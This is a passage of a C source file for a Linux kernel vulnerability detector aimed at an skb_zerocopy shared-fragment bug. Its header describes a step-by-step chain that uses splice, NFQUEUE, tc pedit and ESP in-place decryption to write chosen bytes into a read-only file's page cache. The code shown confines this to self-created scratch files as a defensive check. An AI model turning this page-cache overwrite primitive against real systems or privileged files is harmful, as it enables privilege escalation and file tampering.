/*
 * ZDI-CAN-33367 — safe differential detector ("zerocopy shared-frag" oracle).
 *
 * WHAT THIS IS
 * ------------
 * A self-contained, dependency-free C program that tests whether the running
 * Linux kernel drops the SKBFL_SHARED_FRAG ownership marker when
 * skb_zerocopy() transfers page-backed fragments into an NFQUEUE netlink
 * message, allowing ESP input to authenticated-decrypt IN PLACE over
 * page-cache pages planted with splice() (ZDI-CAN-33367; introduced by
 * af2806f8f90a, ~v3.14; no CVE assigned yet as of 2026-10-26).
 *
 * The primitive it observes, end to end, entirely inside a private
 * user+network namespace:
 *
 *   1. create a self-owned 8 KiB scratch file, chmod 0444 (read-only);
 *   2. unshare(CLONE_NEWUSER|CLONE_NEWNET); bring up lo + nlmon0; install
 *      an XFRM ESP state for 127.0.0.1 (hmac(sha256)-128 + cbc(aes));
 *   3. install an nftables rule that sends all IPv4 LOCAL_OUT packets to
 *      NFQUEUE 0 (COPY_PACKET, copy_range 65535);
 *   4. send a UDP packet to 127.0.0.1 whose payload is 100% splice()-backed:
 *      8 bytes from the read-only scratch file + N bytes from a self-owned
 *      "vector" file.  NFQUEUE builds the queue message with skb_zerocopy()
 *      — the frag references (page-cache pages!) transfer, the shared-frag
 *      marker does NOT (this is the bug under test);
 *   5. the message is also tapped to nlmon0, where a tc u32 filter + tc
 *      pedit action rewrite ONLY the linear prefix of the tapped clone into
 *      a valid, correctly-authenticated ESP packet (crypto computed here in
 *      userland via AF_ALG — no OpenSSL), and act_mirred redirects it to lo;
 *   6. esp4 input then authenticated-decrypts in place.  On a vulnerable
 *      kernel the decryption overwrites the retained file-backed frag pages:
 *      8 chosen bytes land in the page cache of the read-only scratch file.
 *      On a fixed kernel (skb_cow_data unshares the frags) nothing changes.
 *
 * SAFETY CONTRACT (hard requirements, enforced at runtime)
 * --------------------------------------------------------
 *   - The ONLY files ever written or "attacked" are two files this process
 *     created itself in a directory it created itself (mkdtemp): scratch.bin
 *     and vector.bin.  No real-world binary, no /etc, no setuid file, ever.
 *   - Every path used is stat()d and must be owned by the current effective
 *     uid (checked before AND after the unshare, plus fstat() on the open
 *     descriptors).  The program refuses to proceed otherwise.
 *   - The chain runs inside a private userns+netns; destroying the netns at
 *     exit removes every rule/state it created.  All packet traffic stays on
 *     the namespace-private loopback.
 *   - No weaponization: this oracle reports a byte-for-byte differential on
 *     a self-owned file and stops.  (The public PoC already circulates via
 *     the ZDI LKML disclosure; this file is an independent implementation.)
 *
 * ATTRIBUTION
 * -----------
 *   - Vulnerability analysis and public disclosure (including the full PoC
 *     and a harmless-scratch validator transcript): Trend Micro Zero Day
 *     Initiative, posted to LKML/netdev on 2026-10-21 (leaked accidentally;
 *     cached as odd/research/zdi-lkml-report-33367.txt in this repo).
 *   - Fix: "[PATCH v2 net] net: skbuff: propagate shared-frag marker in
 *     skb_zerocopy()" by Zizhen Liu <pointerliu@126.com>, Reviewed-by Eric
 *     Dumazet, 2026-10-22 (2 added lines in net/core/skbuff.c; unmerged as
 *     of 2026-10-26).
 *   - Prior art in the same family: Dirty Pipe, Copy Fail (CVE-2026-31431),
 *     Dirty Frag (CVE-2026-43284, Hyunwoo Kim @v4bel, fix f4c50a4034e6) and
 *     the six other SKBFL_SHARED_FRAG propagation gaps.
 *   - This detector is an original safe-oracle implementation written for
 *     this repository; it does not copy the published PoC.  The fixed public
 *     test keys/SPI below are quoted from the published advisory.
 *
 * REQUIREMENTS
 * ------------
 *   - x86_64 Linux, kernel with unprivileged user namespaces enabled
 *     (user.max_user_namespaces > 0, no seccomp/LSM blocking unshare).
 *   - Kernel config (built-in or already loaded; the detector cannot
 *     modprobe from inside the namespace): CONFIG_USER_NS, CONFIG_NET_NS,
 *     CONFIG_XFRM_USER, CONFIG_INET_ESP, CONFIG_NETFILTER_NETLINK_QUEUE,
 *     CONFIG_NF_TABLES (nft "queue" expression), CONFIG_NLMON,
 *     CONFIG_NET_CLS_U32, CONFIG_NET_ACT_PEDIT, CONFIG_NET_ACT_MIRRED,
 *     CONFIG_NET_SCH_INGRESS (clsact), CONFIG_PACKET, and the AF_ALG chain
 *     CONFIG_CRYPTO_USER_API_HASH + CONFIG_CRYPTO_USER_API_SKCIPHER with
 *     hmac(sha256) and cbc(aes).
 *   - No external libraries: kernel UAPI headers only (linux-libc-dev).
 *
 * USAGE
 * -----
 *   detector [--help] [base_dir]
 *
 *     base_dir   directory under which the private scratch directory is
 *                created (default /tmp).  The scratch files live in
 *                <base_dir>/zdi33367-XXXXXX/ after the run for inspection.
 *
 * EXPECTED DIFFERENTIAL
 * ---------------------
 *   Kernel with the Dirty Frag fix (f4c50a4034e6) but WITHOUT the
 *   skb_zerocopy fix (e.g. mainline v7.1..v7.2):  VULNERABLE   (exit 0)
 *   Same kernel + the 2-line netdev v2 fix applied: NOT-DETECTED (exit 1)
 *
 * EXIT CODES
 * ----------
 *   0  DETECTOR-RESULT: VULNERABLE   — in-place decrypt wrote over the
 *                                      self-owned read-only page-cache page
 *   1  DETECTOR-RESULT: NOT-DETECTED — no divergence observed
 *   2  DETECTOR-FAIL: ...            — setup/config/geometry error, or
 *                                      ambiguous result (see message)
 *   3  DETECTOR-RESULT: SKIPPED      — unprivileged user namespaces not
 *                                      available (not a VULNERABLE verdict)
 *   (--help prints usage and exits 0.)
 *
 * PROTOCOL (stable output lines, greppable from serial logs)
 * ----------------------------------------------------------
 *   PROBE KERNEL / OWNERSHIP / TARGET_FILE / TARGET_WINDOW_BEFORE /
 *   TARGET_SHA256_BEFORE / WRITE_DENIAL / USERNS / SYSCTL / IP_LINK /
 *   XFRM / NFT_QUEUE_SETUP / NFQUEUE_BIND / PROBE (layout numbers) /
 *   LAYOUT / CRYPTO / ESP_SELFTEST / TC_NETLINK_SETUP / CAPS / TRIGGER /
 *   TRIGGER_MSG_HEAD / INNER_UDP_RECEIVED / TARGET_WINDOW_AFTER /
 *   TARGET_SHA256_AFTER / VECTOR_SHA256_AFTER / MMAP_VIEW / EVICTION /
 *   DETECTOR-DISK / DETECTOR-RESULT
 *
 * DISK-CLEAN SEMANTICS
 * --------------------
 *   DETECTOR-DISK mirrors the sibling CVE-2026-31431 detector: after a
 *   page-cache divergence is observed we ask the kernel to drop the page
 *   (posix_fadvise DONTNEED) and re-read from a fresh descriptor.
 *     CLEAN  — the change did not survive eviction: the page was modified
 *              in memory but never marked dirty, so the on-disk block still
 *              holds the original pattern (typical on real disk filesystems).
 *     DIRTY  — the change survived the eviction attempt.
 *     SKIPPED — no divergence to test.
 *   CAVEAT for the lab (and for tmpfs/initramfs in general): on tmpfs the
 *   "disk" IS the page cache, so DIRTY is the expected outcome there and
 *   does NOT imply persistence to storage; CLEAN can only be demonstrated
 *   on a real block-backed filesystem.  The oracle verdict never depends on
 *   this line.
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>

#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nfnetlink_queue.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <linux/tc_act/tc_pedit.h>
#include <linux/tc_act/tc_mirred.h>
#include <linux/xfrm.h>
#include <linux/if_alg.h>

/* Fallbacks if libc headers are old — values are the stable UAPI ones
 * (same posture as the sibling detector). */
#ifndef AF_ALG
#define AF_ALG 38
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif
#ifndef ALG_SET_IV
#define ALG_SET_IV 2
#endif
#ifndef ALG_SET_OP
#define ALG_SET_OP 3
#endif
#ifndef ALG_OP_DECRYPT
#define ALG_OP_DECRYPT 0
#endif
#ifndef ALG_OP_ENCRYPT
#define ALG_OP_ENCRYPT 1
#endif
#ifndef TC_H_CLSACT
#define TC_H_CLSACT TC_H_INGRESS
#endif
/* NLA_* attribute macros are kernel-internal (include/linux/netlink.h),
 * not exported UAPI — define the canonical forms locally if absent. */
#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif
#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif
#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int) NLA_ALIGN(sizeof(struct nlattr)))
#endif
#ifndef NLA_DATA
#define NLA_DATA(nla) ((void *)((char *)(nla) + NLA_HDRLEN))
#endif

/* ------------------------------------------------------------------ */
/* Protocol constants                                                  */
/* ------------------------------------------------------------------ */

#define EXIT_VULN      0
#define EXIT_NOTDET    1
#define EXIT_FAIL      2
#define EXIT_SKIPPED   3

#define PROBE_PORT     5555u          /* UDP port used inside the netns    */
#define SCRATCH_SIZE   8192u          /* scratch file size (ZDI validator) */
#define TARGET_OFF     4160u          /* file offset of the 8-byte oracle  */
#define TARGET_BYTES   8u             /* bytes spliced from the target     */
#define WINDOW_OFF     (TARGET_OFF - 16u) /* hexdump window start          */
#define WINDOW_LEN     40u            /* hexdump window size               */
#define PROBE_VEC_LEN  514u           /* vector bytes for the probe packet */

/* ESP parameters — fixed public test values from the published advisory.
 * Choices: no ESN and replay-window 0 keep this the simplest configuration
 * that still exercises the in-place path (the same seq number is used by
 * the self-test injection and the real trigger); hmac(sha256)-128 +
 * cbc(aes) match the ZDI validator exactly. */
#define ESP_SPI        0x100u
#define ESP_SEQ        1u
#define AUTH_KEY_LEN   32u            /* hmac(sha256) key bytes            */
#define ICV_BITS       128u           /* auth-trunc length                 */
#define ICV_LEN        (ICV_BITS / 8u)
#define AES_KEY_LEN    16u            /* cbc(aes)-128                      */
#define BLK            16u            /* AES block / CBC(aes) IV size      */
#define ETH_HDR        14u
#define IP_HDR         20u
#define ESP_HDR        8u
#define ESP_IV         16u
#define CT0            (ETH_HDR + IP_HDR + ESP_HDR + ESP_IV) /* msg off 58 */

/* Netlink message layout invariant (verified at runtime by the probe):
 *   nlmsghdr(16) + nfgenmsg(4) + attrs(A) + NFQA_PAYLOAD nla hdr(4)
 *   + linear copy of the queued packet's 28-byte linear head
 *     (IPv4 header 20 + UDP header 8 — the payload is 100% spliced, so the
 *     head is exactly the two headers).  The first frag byte (the target
 *     file's page-cache bytes) therefore sits at payload_data + 28.
 * Matches the ZDI validator transcript: nfq_msglen=618, frag=[96,104),
 * vector=[104,618), 24 pedit keys, offset 4160 in an 8 KiB 0444 file. */
#define UDP_PAYLOAD_LINEAR 28u

#define MAX_PEDIT_KEYS 32u            /* tc_pedit key budget (frame <=128B) */
#define MAX_MSG        2048u          /* netlink message buffer cap         */

/* 8-byte marker the vulnerable kernel writes into the scratch page cache. */
static const uint8_t MARKER[8] = { '3','3','3','6','7','O','K','!' };

/* Public test keys from the ZDI advisory (not secrets). */
static const uint8_t AUTH_KEY[32] = {
	0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,
	0x48,0x49,0x4a,0x4b,0x4c,0x4d,0x4e,0x4f,
	0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,
	0x58,0x59,0x5a,0x5b,0x5c,0x5d,0x5e,0x5f
};
static const uint8_t ENC_KEY[16] = {
	0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,
	0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f
};

/* ------------------------------------------------------------------ */
/* Run state                                                           */
/* ------------------------------------------------------------------ */

static char g_dir[256];               /* private scratch directory         */
static char g_scratch_path[320];
static char g_vector_path[320];
static uid_t g_ruid, g_euid;
static gid_t g_egid;

/* Geometry learned from the probe packet (see PROBE layout line). */
static unsigned g_L;                  /* probe nfq nlmsg_len (618 expected) */
static unsigned g_P0;                 /* NFQA_PAYLOAD payload offset (68)   */
static unsigned g_d;                  /* alignment pad added to payload     */
static unsigned g_M;                  /* predicted trigger nlmsg_len        */
static unsigned g_frag;               /* first frag byte offset (96)        */
static unsigned g_veclen;             /* trigger vector length              */
static unsigned g_inner_expect;       /* expected inner UDP payload length  */

static uint8_t g_full[MAX_MSG];       /* composed trigger message [0,M)     */

/* ------------------------------------------------------------------ */
/* Logging / termination helpers                                       */
/* ------------------------------------------------------------------ */

static void fail(const char *fmt, ...)
{
	int saved = errno;
	va_list ap;
	va_start(ap, fmt);
	fputs("DETECTOR-FAIL: ", stdout);
	vprintf(fmt, ap);
	if (saved)
		printf(" (errno=%d %s)", saved, strerror(saved));
	putchar('\n');
	va_end(ap);
	exit(EXIT_FAIL);
}

static void probe(const char *fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	fputs("PROBE ", stdout);
	vprintf(fmt, ap);
	putchar('\n');
	va_end(ap);
}

static void hexdump_lines(const uint8_t *p, size_t len)
{
	size_t i, j;
	for (i = 0; i < len; i += 16) {
		printf("  %04zx: ", i);
		for (j = i; j < i + 16 && j < len; j++)
			printf("%02x ", p[j]);
		putchar('\n');
	}
}

static void sleep_ms(unsigned ms)
{
	struct timespec ts;
	ts.tv_sec = ms / 1000u;
	ts.tv_nsec = (long)(ms % 1000u) * 1000000L;
	nanosleep(&ts, NULL);
}

/* ================================================================== */
/* SHA-256 (public-domain style implementation; spec-derived)          */
/* ================================================================== */

typedef struct {
	uint32_t h[8];
	uint64_t bytes;
	uint8_t  buf[64];
	size_t   fill;
} sha256_ctx;

static const uint32_t sha256_k[64] = {
	0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,
	0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,
	0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,
	0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
	0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,
	0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,
	0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,
	0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
	0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,
	0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,
	0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2
};

#define ROR(x,n) (((x) >> (n)) | ((x) << (32 - (n))))

static void sha256_block(sha256_ctx *c, const uint8_t *p)
{
	uint32_t w[64], a, b, cc, d, e, f, g, h;
	unsigned i;
	uint32_t t1, t2;

	for (i = 0; i < 16; i++)
		w[i] = ((uint32_t)p[i*4] << 24) | ((uint32_t)p[i*4+1] << 16) |
		       ((uint32_t)p[i*4+2] << 8) | (uint32_t)p[i*4+3];
	for (i = 16; i < 64; i++) {
		uint32_t s0 = ROR(w[i-15],7) ^ ROR(w[i-15],18) ^ (w[i-15] >> 3);
		uint32_t s1 = ROR(w[i-2],17) ^ ROR(w[i-2],19) ^ (w[i-2] >> 10);
		w[i] = w[i-16] + s0 + w[i-7] + s1;
	}
	a = c->h[0]; b = c->h[1]; cc = c->h[2]; d = c->h[3];
	e = c->h[4]; f = c->h[5]; g  = c->h[6]; h = c->h[7];
	for (i = 0; i < 64; i++) {
		uint32_t S1 = ROR(e,6) ^ ROR(e,11) ^ ROR(e,25);
		uint32_t ch = (e & f) ^ ((~e) & g);
		uint32_t S0 = ROR(a,2) ^ ROR(a,13) ^ ROR(a,22);
		uint32_t mj = (a & b) ^ (a & cc) ^ (b & cc);
		t1 = h + S1 + ch + sha256_k[i] + w[i];
		t2 = S0 + mj;
		h = g; g = f; f = e; e = d + t1;
		d = cc; cc = b; b = a; a = t1 + t2;
	}
	c->h[0] += a; c->h[1] += b; c->h[2] += cc; c->h[3] += d;
	c->h[4] += e; c->h[5] += f; c->h[6] += g; c->h[7] += h;
}

static void sha256_init(sha256_ctx *c)
{
	c->h[0] = 0x6a09e667; c->h[1] = 0xbb67ae85;
	c->h[2] = 0x3c6ef372; c->h[3] = 0xa54ff53a;
	c->h[4] = 0x510e527f; c->h[5] = 0x9b05688c;
	c->h[6] = 0x1f83d9ab; c->h[7] = 0x5be0cd19;
	c->bytes = 0;
	c->fill = 0;
}

static void sha256_update(sha256_ctx *c, const void *data, size_t len)
{
	const uint8_t *p = data;
	c->bytes += len;
	while (len) {
		size_t n = 64 - c->fill;
		if (n > len)
			n = len;
		memcpy(c->buf + c->fill, p, n);
		c->fill += n;
		p += n;
		len -= n;
		if (c->fill == 64) {
			sha256_block(c, c->buf);
			c->fill = 0;
		}
	}
}

static void sha256_final(sha256_ctx *c, uint8_t out[32])
{
	uint64_t bits = c->bytes * 8;
	uint8_t pad = 0x80;
	unsigned i;
	sha256_update(c, &pad, 1);
	pad = 0;
	while (c->fill != 56)
		sha256_update(c, &pad, 1);
	for (i = 0; i < 8; i++)
		c->buf[56 + i] = (uint8_t)(bits >> (56 - 8 * i));
	sha256_block(c, c->buf);
	for (i = 0; i < 8; i++) {
		out[i*4]   = (uint8_t)(c->h[i] >> 24);
		out[i*4+1] = (uint8_t)(c->h[i] >> 16);
		out[i*4+2] = (uint8_t)(c->h[i] >> 8);
		out[i*4+3] = (uint8_t)(c->h[i]);
	}
}

static void sha256_hex(const uint8_t *data, size_t len, char hex[65])
{
	sha256_ctx c;
	uint8_t d[32];
	unsigned i;
	sha256_init(&c);
	sha256_update(&c, data, len);
	sha256_final(&c, d);
	for (i = 0; i < 32; i++)
		sprintf(hex + 2 * i, "%02x", d[i]);
	hex[64] = 0;
}

/* ================================================================== */
/* AF_ALG userland crypto: cbc(aes) skcipher + hmac(sha256) hash       */
/* ================================================================== */

static int g_aes_op = -1;

static void alg_open_skcipher(void)
{
	struct sockaddr_alg sa;
	int s, op;

	memset(&sa, 0, sizeof(sa));
	sa.salg_family = AF_ALG;
	memcpy(sa.salg_type, "skcipher", 9);
	memcpy(sa.salg_name, "cbc(aes)", 9);

	s = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (s < 0)
		fail("socket(AF_ALG) - CONFIG_CRYPTO_USER_API_SKCIPHER?");
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		fail("bind cbc(aes) - algorithm unavailable");
	if (setsockopt(s, SOL_ALG, ALG_SET_KEY, ENC_KEY, AES_KEY_LEN) < 0)
		fail("ALG_SET_KEY cbc(aes)");
	op = accept(s, NULL, NULL);
	if (op < 0)
		fail("accept cbc(aes)");
	close(s);
	g_aes_op = op;
}

/* One cbc(aes) operation: out = op(in) with the given IV (block aligned). */
static void aes_cbc_op(uint32_t alg_op, const uint8_t *iv, const void *in,
		       size_t n, uint8_t *out)
{
	uint8_t ivbuf[sizeof(struct af_alg_iv) + BLK] __attribute__((aligned(8)));
	char cbuf[CMSG_SPACE(4) + CMSG_SPACE(sizeof(ivbuf))];
	struct af_alg_iv *aiv = (struct af_alg_iv *)ivbuf;
	struct cmsghdr *cm;
	struct iovec iov;
	struct msghdr msg;
	ssize_t r;

	if (n == 0 || (n % BLK) != 0)
		fail("aes_cbc_op: length %zu not block-aligned", n);

	memset(ivbuf, 0, sizeof(ivbuf));
	aiv->ivlen = BLK;
	memcpy(aiv->iv, iv, BLK);
	memset(cbuf, 0, sizeof(cbuf));
	memset(&msg, 0, sizeof(msg));
	iov.iov_base = (void *)in;
	iov.iov_len = n;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = cbuf;
	msg.msg_controllen = sizeof(cbuf);

	cm = CMSG_FIRSTHDR(&msg);
	cm->cmsg_level = SOL_ALG;
	cm->cmsg_type = ALG_SET_OP;
	cm->cmsg_len = CMSG_LEN(4);
	memcpy(CMSG_DATA(cm), &alg_op, 4);
	cm = CMSG_NXTHDR(&msg, cm);
	cm->cmsg_level = SOL_ALG;
	cm->cmsg_type = ALG_SET_IV;
	cm->cmsg_len = CMSG_LEN(sizeof(ivbuf));
	memcpy(CMSG_DATA(cm), ivbuf, sizeof(ivbuf));

	if (sendmsg(g_aes_op, &msg, 0) != (ssize_t)n)
		fail("AF_ALG cbc sendmsg");
	r = read(g_aes_op, out, n);
	if (r != (ssize_t)n)
		fail("AF_ALG cbc read (r=%zd errno=%d)", r, errno);
}

/* Raw single-block ops used by the ESP ciphertext solver. */
static const uint8_t g_zero_iv[BLK];

static void aes_dec_raw(const uint8_t in[BLK], uint8_t out[BLK])
{
	aes_cbc_op(ALG_OP_DECRYPT, g_zero_iv, in, BLK, out);
}

static void aes_enc_cbc(const uint8_t iv[BLK], const uint8_t in[BLK],
			uint8_t out[BLK])
{
	aes_cbc_op(ALG_OP_ENCRYPT, iv, in, BLK, out);
}

/* hmac(sha256) with truncation to ICV_LEN bytes. */
static void hmac_sha256_trunc(const uint8_t *data, size_t len,
			      uint8_t out[ICV_LEN])
{
	struct sockaddr_alg sa;
	uint8_t dg[32];
	int s, op;
	size_t off = 0;
	ssize_t r;

	memset(&sa, 0, sizeof(sa));
	sa.salg_family = AF_ALG;
	memcpy(sa.salg_type, "hash", 5);
	memcpy(sa.salg_name, "hmac(sha256)", 13);

	s = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (s < 0)
		fail("socket(AF_ALG) hash - CONFIG_CRYPTO_USER_API_HASH?");
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		fail("bind hmac(sha256)");
	if (setsockopt(s, SOL_ALG, ALG_SET_KEY, AUTH_KEY, AUTH_KEY_LEN) < 0)
		fail("ALG_SET_KEY hmac(sha256)");
	op = accept(s, NULL, NULL);
	if (op < 0)
		fail("accept hmac(sha256)");
	while (off < len) {
		size_t chunk = len - off;
		if (chunk > 65536)
			chunk = 65536;
		if (write(op, data + off, chunk) != (ssize_t)chunk)
			fail("hmac write");
		off += chunk;
	}
	r = read(op, dg, sizeof(dg));
	if (r != 32)
		fail("hmac read (r=%zd)", r);
	close(op);
	close(s);
	memcpy(out, dg, ICV_LEN);
}

/* ================================================================== */
/* Netlink message builder                                             */
/* ================================================================== */

struct nb {
	unsigned char *b;
	size_t cap, len;
	uint32_t seq;
};

static void nb_init(struct nb *nb, void *mem, size_t cap)
{
	nb->b = mem;
	nb->cap = cap;
	nb->len = 0;
	nb->seq = (uint32_t)getpid();
}

static void *nb_put(struct nb *nb, size_t n)
{
	size_t al = (n + 3u) & ~(size_t)3u;
	void *p;
	if (al > nb->cap - nb->len)
		fail("netlink buffer overflow");
	p = nb->b + nb->len;
	memset(p, 0, n);                        /* zero the requested region */
	memset(nb->b + nb->len + n, 0, al - n); /* zero pad to alignment     */
	nb->len += al;
	return p;
}

/* Begin a message; returns its aligned byte offset for nb_msg_end(). */
static size_t nb_msg_begin(struct nb *nb, uint16_t type, uint16_t flags,
			   void **exthdr, size_t extlen)
{
	struct nlmsghdr *h = nb_put(nb, sizeof(*h));
	size_t off = nb->len - sizeof(*h);
	h->nlmsg_type = type;
	h->nlmsg_flags = flags;
	h->nlmsg_seq = ++nb->seq;
	h->nlmsg_pid = 0;
	if (exthdr && extlen)
		*exthdr = nb_put(nb, extlen);
	return off;
}

static void nb_msg_end(struct nb *nb, size_t off)
{
	struct nlmsghdr *h = (struct nlmsghdr *)(nb->b + off);
	h->nlmsg_len = (uint32_t)(nb->len - off);
}

static void nla_put_raw(struct nb *nb, uint16_t type, const void *data,
			size_t len)
{
	struct nlattr *a = nb_put(nb, sizeof(*a));
	a->nla_type = type;
	a->nla_len = (uint16_t)(NLA_HDRLEN + len);
	memcpy(nb_put(nb, len), data, len);
}

static void nla_put_strz(struct nb *nb, uint16_t type, const char *s)
{
	nla_put_raw(nb, type, s, strlen(s) + 1);
}

static void nla_put_u32be(struct nb *nb, uint16_t type, uint32_t v)
{
	uint32_t be = htonl(v);
	nla_put_raw(nb, type, &be, 4);
}

static void nla_put_u16be(struct nb *nb, uint16_t type, uint16_t v)
{
	uint16_t be = htons(v);
	nla_put_raw(nb, type, &be, 2);
}

static size_t nest_begin(struct nb *nb, uint16_t type)
{
	struct nlattr *a = nb_put(nb, sizeof(*a));
	a->nla_type = type | NLA_F_NESTED;
	return nb->len - sizeof(*a);
}

static void nest_end(struct nb *nb, size_t off)
{
	struct nlattr *a = (struct nlattr *)(nb->b + off);
	a->nla_len = (uint16_t)(nb->len - off);
}

/* ---- netlink sockets ------------------------------------------------ */

static int nl_socket(int proto)
{
	struct sockaddr_nl sa;
	struct timeval tv;
	int fd = socket(AF_NETLINK, SOCK_RAW, proto);
	if (fd < 0)
		fail("socket(AF_NETLINK,%d)", proto);
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		fail("netlink bind");
	tv.tv_sec = 5;
	tv.tv_usec = 0;
	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
	return fd;
}

static void nl_send_buffer(int fd, const struct nb *nb)
{
	struct sockaddr_nl sa;
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	sa.nl_pid = 0;
	if (sendto(fd, nb->b, nb->len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		fail("netlink sendto");
}

/* Wait for one ACK (NLMSG_ERROR with error==0); skips unrelated messages. */
static void nl_wait_ack(int fd, const char *what)
{
	char buf[4096];
	ssize_t n;

	for (;;) {
		struct nlmsghdr *h;
		struct nlmsgerr *e;

		n = recv(fd, buf, sizeof(buf), 0);
		if (n < 0)
			fail("%s: no ack", what);
		if ((size_t)n < sizeof(struct nlmsghdr))
			continue;
		h = (struct nlmsghdr *)buf;
		if (h->nlmsg_type == NLMSG_ERROR) {
			e = (struct nlmsgerr *)NLMSG_DATA(h);
			if (e->error != 0) {
				errno = -e->error;
				fail("%s: netlink error", what);
			}
			return;
		}
		/* skip anything else */
	}
}

/* ================================================================== */
/* Scratch / vector files (self-owned only - HARD SAFETY)              */
/* ================================================================== */

static void ensure_owned(const char *path, const char *what)
{
	struct stat st;
	if (stat(path, &st) < 0)
		fail("stat %s (%s)", what, path);
	if (st.st_uid != geteuid())
		fail("SAFETY ABORT: %s (%s) is owned by uid %u, not by current euid %u - refusing to touch files we do not own",
		     what, path, (unsigned)st.st_uid, (unsigned)geteuid());
}

static int write_all(int fd, const void *buf, size_t len)
{
	const uint8_t *p = buf;
	while (len) {
		ssize_t n = write(fd, p, len);
		if (n < 0)
			return -1;
		p += n;
		len -= (size_t)n;
	}
	return 0;
}

/* Deterministic fill patterns (documented, reproducible). */
static uint8_t scratch_byte(size_t i)
{
	return (uint8_t)((i * 37u + 101u) & 0xffu);
}

static uint8_t vector_byte(size_t i)
{
	return (uint8_t)(0x80u + (i & 63u));
}

/* ================================================================== */
/* Stage 1: scratch files                                              */
/* ================================================================== */

static void create_scratch_files(const char *base)
{
	static uint8_t content[SCRATCH_SIZE];
	uint8_t window[WINDOW_LEN];
	char hex[65];
	size_t i;
	struct stat st;
	int fd;

	/* Private directory we own. */
	if (snprintf(g_dir, sizeof(g_dir), "%s/zdi33367-XXXXXX", base) >=
	    (int)sizeof(g_dir))
		fail("base dir too long");
	if (mkdtemp(g_dir) == NULL)
		fail("mkdtemp under %s (writable dir needed)", base);
	ensure_owned(g_dir, "scratch dir");

	snprintf(g_scratch_path, sizeof(g_scratch_path), "%s/scratch.bin", g_dir);
	snprintf(g_vector_path, sizeof(g_vector_path), "%s/vector.bin", g_dir);

	/* Scratch: 8 KiB pattern, fsync, chmod 0444. */
	for (i = 0; i < SCRATCH_SIZE; i++)
		content[i] = scratch_byte(i);
	fd = open(g_scratch_path, O_WRONLY | O_CREAT | O_EXCL, 0600);
	if (fd < 0)
		fail("create scratch file");
	if (fstat(fd, &st) < 0 || st.st_uid != g_euid)
		fail("scratch file ownership check");
	if (write_all(fd, content, sizeof(content)) < 0 || fsync(fd) < 0)
		fail("write scratch file");
	if (fchmod(fd, 0444) < 0)
		fail("chmod 0444 scratch");
	close(fd);
	ensure_owned(g_scratch_path, "scratch file");

	/* Vector: initially the harmless probe pattern; rewritten later. */
	fd = open(g_vector_path, O_RDWR | O_CREAT | O_EXCL, 0600);
	if (fd < 0)
		fail("create vector file");
	if (fstat(fd, &st) < 0 || st.st_uid != g_euid)
		fail("vector file ownership check");
	for (i = 0; i < 2048; i++)
		content[i] = vector_byte(i);
	if (write_all(fd, content, 2048) < 0)
		fail("write vector file");
	/* fd intentionally NOT kept open: the final rewrite reopens O_RDWR. */
	close(fd);
	ensure_owned(g_vector_path, "vector file");

	/* Snapshot the target window + whole-file hash (fresh read-only fd). */
	fd = open(g_scratch_path, O_RDONLY);
	if (fd < 0)
		fail("reopen scratch RO");
	if (fstat(fd, &st) < 0)
		fail("fstat scratch");
	if (pread(fd, window, WINDOW_LEN, (off_t)WINDOW_OFF) != (ssize_t)WINDOW_LEN)
		fail("read target window");
	if (pread(fd, content, SCRATCH_SIZE, 0) != (ssize_t)SCRATCH_SIZE)
		fail("read scratch for hash");
	close(fd);
	sha256_hex(content, SCRATCH_SIZE, hex);

	printf("DETECTOR-PROBE file=%s size=%u off=%u window=[%u,%u)\n",
